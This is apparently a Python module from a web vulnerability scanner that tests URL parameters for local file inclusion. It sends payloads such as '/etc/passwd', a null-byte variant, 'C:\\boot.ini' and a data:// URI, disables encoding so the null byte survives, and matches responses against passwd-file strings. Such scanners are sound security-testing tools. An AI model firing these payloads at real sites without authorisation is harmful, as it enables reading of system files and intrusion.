
import types
from core.scan.module import GeneralScanner

class LFI(GeneralScanner):

    def __init__(self, config) -> None:
        GeneralScanner.__init__(self, config)

    def check(self):
        params = self.request.GetParams()

        for param , values in params.items():
            value = values.__getitem__(0)
            
            if value.startswith("http"):
                continue
            
            self.vulnerable_params.append(param)

        return bool(self.vulnerable_params)

    def GetPayloads(self) -> list:
        return [
            "data://text/plain;base64,TEZJQjAwTQ==",
            "/etc/passwd","file://etc/passwd","/etc/passwd%00",
            "C:\\boot.ini"
        ]
              
    def is_vulnerable(self,res):
        expected_response = [
            "LFIB00M", "Volume Serial",
            "root:x:0:0","/root:/bin/bash","daemon","/usr/sbin/nologin" 
        ]

        for text in expected_response:
            if text.lower() in res.text.lower():
                return True

        return False

    def GetUrl(self, requestInstance):
        # override Request.GetUrl for doesn't encode paramas 
        # encode null byte %00 breaks the attack
        
        urlparams = str()

        for param, value in requestInstance.urlparams.items():
            urlparams += param + '=' + value
            if param != list(requestInstance.urlparams.keys())[-1]:
                urlparams += '&'
                
        return f"{requestInstance.uri.scheme}://{requestInstance.uri.netloc}{requestInstance.uri.path}?{urlparams}"

    def run(self):
        # override GetUrl function to our implementation (Strategy Pattern)
        self.request.GetUrl = types.MethodType(self.GetUrl, self.request)

        return GeneralScanner.run(self)
